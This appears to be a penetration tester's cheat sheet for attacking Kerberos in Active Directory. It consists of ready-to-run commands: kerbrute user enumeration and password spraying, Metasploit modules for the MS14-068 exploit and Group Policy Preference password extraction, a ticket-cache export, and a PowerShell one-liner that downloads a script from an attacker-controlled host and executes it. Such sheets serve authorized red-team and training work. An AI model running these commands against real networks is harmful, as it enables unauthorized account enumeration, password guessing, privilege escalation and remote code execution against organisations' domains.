# kerberos

% kerberos

## Kerbrute usersenum
#plateform/linux #target/remote #port/88 #protocol/kerberos #cat/ATTACK/BRUTEFORCE-SPRAY 
```
kerbrute userenum --dc <dc_ip> <users_wordlist>
```

## Kerbrute password spraying user=pass
#plateform/linux #target/remote #port/88 #protocol/kerberos #cat/ATTACK/BRUTEFORCE-SPRAY 
```
kerbrute passwordspray --dc <dc_ip> -d <domain> <users_wordlist> --user-as-pass
```

## Kerbrute password spraying
#plateform/linux #target/remote #port/88 #protocol/kerberos #cat/ATTACK/BRUTEFORCE-SPRAY 
```
kerbrute passwordspray --dc <dc_ip> -d <domain> <users_wordlist> <password>
```

## kerberos ms14-068
#plateform/linux #target/remote #port/88 #protocol/kerberos #cat/ATTACK/EXPLOIT 
```
msfconsole -x "use auxiliary/admin/kerberos/ms14_068_kerberos_checksum"
```

## exploit gpp - group policy preference (ms14-025)
#plateform/linux #target/remote #port/88 #protocol/kerberos #cat/RECON 
```
msfconsole -x "use scanner/smb/smb_enum_gpp"
```

## Export TGT to cache
#plateform/linux #port/88 #protocol/kerberos
```
export KRB5CCNAME=$(pwd)/<user>.ccache
```

## powershell - get user SPN
#plateform/windows #target/remote #port/88 #protocol/kerberos #cat/RECON 

https://github.com/nidem/kerberoast
```powershell
(new-object system.net.webclient).downloadstring('http://<lhost>/GetUserSPNs.ps1') | IEX
```